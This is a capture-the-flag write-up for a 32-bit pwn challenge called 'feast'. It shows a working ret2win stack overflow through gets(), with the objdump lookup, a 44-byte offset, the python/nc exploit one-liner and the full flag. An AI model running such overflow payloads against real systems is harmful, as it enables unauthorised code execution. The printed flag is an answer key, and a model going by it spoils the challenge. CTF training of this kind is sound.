> We've prepared a special meal for you. You just need to find it. (This is a 32 bit program) nc [pwn.red.csaw.io](http://pwn.red.csaw.io/) 5001

1. Determine what function you need to call
    - We want to call `winner_winner_chicken_dinner()`, but that isn't called anywhere in the program
    - Luckily, the `vuln()` function makes a call to `gets()`, which is vulnerable to stack overflows
2. Determine the location of the function

    ```bash
    objdump -D feast | grep winner_winner_chicken_dinner
    ```

    - This outputs:

    ```bash
    08048586 <winner_winner_chicken_dinner>:
    80485a8:	75 2a   	jne    80485d4 <winner_winner_chicken_dinner+0x4e>
    ```

    - Thus, the address of the function is at 0x08048586
3. Convert the function location into little endian
    - becomes `\x86\x85\x04\x08`
4. Determine where the overflow occurs

    ```bash
    for i in {1..64};do echo $i; python -c "print('A'*$i + '\x86\x85\x04\x08')" | ./feast; done 
    ```

    - Assuming the overflow is withing 64 bytes, this will print the flag and tell use where the overflow occurs
    - It occurs at 44 bytes
5. Get the flag

    ```bash
    python -c "print('A'*44 + '\x86\x85\x04\x08')" | nc pwn.red.csaw.io 5001 | grep "flag"
    ```

6. The flag is flag{3nj0y_7h3_d1nN3r_B16_w1Nn3r!}
